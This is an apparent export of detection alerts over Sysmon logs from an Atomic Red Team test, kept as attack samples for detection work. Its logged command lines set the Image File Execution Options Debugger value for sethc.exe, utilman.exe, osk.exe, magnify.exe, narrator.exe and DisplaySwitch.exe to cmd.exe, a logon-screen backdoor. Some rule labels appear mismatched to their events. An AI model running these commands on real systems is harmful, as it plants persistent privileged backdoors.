2019-07-19T14:50:02.194097+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3730,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg add "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution ""Options\osk.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 1228
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-D89A-5D31-0000-0010A46B3200
ProcessId: 3704
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D89A-5D31-0000-0010F56D3200
CommandLine: reg  add "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution ""Options\osk.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:50:02.190
"
2019-07-19T14:50:02.220426+00:00,Sticky Key Like Backdoor Usage - Registry,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,13,3731,MSEDGEWIN10,"Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\Debugger
RuleName: Persistence - IFEO Debugger ValueSet
EventType: SetValue
ProcessId: 3704
ProcessGuid: 747F3D96-D89A-5D31-0000-0010F56D3200
UtcTime: 2019-07-19 14:50:02.212
Details: C:\windows\system32\cmd.exe
"
2019-07-19T14:50:02.249575+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3732,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 1132
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D89A-5D31-0000-0010F2703200
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:50:02.238
"
2019-07-19T14:50:07.279972+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3733,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 864
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D89F-5D31-0000-00106C7D3200
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg add "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution ""Options\sethc.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:50:07.254
"
2019-07-19T14:50:07.299766+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3734,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg add "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution ""Options\sethc.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 864
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-D89F-5D31-0000-00106C7D3200
ProcessId: 1860
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D89F-5D31-0000-0010BD7F3200
CommandLine: reg  add "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution ""Options\sethc.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:50:07.295
"
2019-07-19T14:50:07.322063+00:00,Sticky Key Like Backdoor Usage - Registry,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,13,3735,MSEDGEWIN10,"Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger
RuleName: Persistence - IFEO Debugger ValueSet
EventType: SetValue
ProcessId: 1860
ProcessGuid: 747F3D96-D89F-5D31-0000-0010BD7F3200
UtcTime: 2019-07-19 14:50:07.307
Details: C:\windows\system32\cmd.exe
"
2019-07-19T14:50:07.357083+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3736,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 2404
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D89F-5D31-0000-0010BC823200
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:50:07.335
"
2019-07-19T14:50:10.266630+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3737,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 6156
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8A2-5D31-0000-00108A8F3200
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg add "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution ""Options\utilman.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:50:10.253
"
2019-07-19T14:50:10.282757+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3738,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg add "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution ""Options\utilman.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6156
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-D8A2-5D31-0000-00108A8F3200
ProcessId: 2272
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8A2-5D31-0000-0010D5913200
CommandLine: reg  add "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution ""Options\utilman.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:50:10.274
"
2019-07-19T14:50:10.295724+00:00,Sticky Key Like Backdoor Usage - Registry,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,13,3739,MSEDGEWIN10,"Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe\Debugger
RuleName: Persistence - IFEO Debugger ValueSet
EventType: SetValue
ProcessId: 2272
ProcessGuid: 747F3D96-D8A2-5D31-0000-0010D5913200
UtcTime: 2019-07-19 14:50:10.275
Details: C:\windows\system32\cmd.exe
"
2019-07-19T14:50:10.324832+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3740,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 2484
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8A2-5D31-0000-0010D8943200
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:50:10.306
"
2019-07-19T14:50:13.109148+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3741,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 4212
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8A5-5D31-0000-0010729B3200
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg add "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution ""Options\magnify.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:50:13.096
"
2019-07-19T14:50:13.127595+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3742,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg add "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution ""Options\magnify.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4212
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-D8A5-5D31-0000-0010729B3200
ProcessId: 5000
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8A5-5D31-0000-0010C39D3200
CommandLine: reg  add "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution ""Options\magnify.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:50:13.119
"
2019-07-19T14:50:13.153167+00:00,Sticky Key Like Backdoor Usage - Registry,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,13,3743,MSEDGEWIN10,"Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe\Debugger
RuleName: Persistence - IFEO Debugger ValueSet
EventType: SetValue
ProcessId: 5000
ProcessGuid: 747F3D96-D8A5-5D31-0000-0010C39D3200
UtcTime: 2019-07-19 14:50:13.137
Details: C:\windows\system32\cmd.exe
"
2019-07-19T14:50:13.185016+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3744,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 6116
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8A5-5D31-0000-0010C0A03200
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:50:13.173
"
2019-07-19T14:50:14.678185+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3745,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 6888
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8A6-5D31-0000-001053A73200
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg add "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution ""Options\narrator.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:50:14.649
"
2019-07-19T14:50:14.692289+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3746,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg add "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution ""Options\narrator.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6888
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-D8A6-5D31-0000-001053A73200
ProcessId: 5972
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8A6-5D31-0000-0010A5A93200
CommandLine: reg  add "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution ""Options\narrator.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:50:14.687
"
2019-07-19T14:50:14.716040+00:00,Sticky Key Like Backdoor Usage - Registry,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,13,3747,MSEDGEWIN10,"Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe\Debugger
RuleName: Persistence - IFEO Debugger ValueSet
EventType: SetValue
ProcessId: 5972
ProcessGuid: 747F3D96-D8A6-5D31-0000-0010A5A93200
UtcTime: 2019-07-19 14:50:14.697
Details: C:\windows\system32\cmd.exe
"
2019-07-19T14:50:14.827321+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3748,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 6664
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8A6-5D31-0000-0010F9B13200
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:50:14.762
"
2019-07-19T14:50:17.941637+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3749,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 6068
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8A9-5D31-0000-001072C43200
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg add "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution ""Options\DisplaySwitch.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:50:17.916
"
2019-07-19T14:50:17.963904+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3750,MSEDGEWIN10,"Image: C:\Windows\System32\reg.exe
RuleName: ''
Description: Registry Console Tool
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""reg add "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution ""Options\DisplaySwitch.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6068
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=429DF8371B437209D79DC97978C33157D1A71C4B,MD5=8A93ACAC33151793F8D52000071C0B06,SHA256=19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: 747F3D96-D8A9-5D31-0000-001072C43200
ProcessId: 5124
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D8A9-5D31-0000-0010C0C63200
CommandLine: reg  add "" HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution ""Options\DisplaySwitch.exe /v Debugger /t REG_SZ /d C:\windows\system32\cmd.exe /f
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:50:17.959
"
2019-07-19T14:50:17.990891+00:00,Sticky Key Like Backdoor Usage - Registry,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,13,3751,MSEDGEWIN10,"Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe\Debugger
RuleName: Persistence - IFEO Debugger ValueSet
EventType: SetValue
ProcessId: 5124
ProcessGuid: 747F3D96-D8A9-5D31-0000-0010C0C63200
UtcTime: 2019-07-19 14:50:17.979
Details: C:\windows\system32\cmd.exe
"
2019-07-19T14:50:18.009564+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3752,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
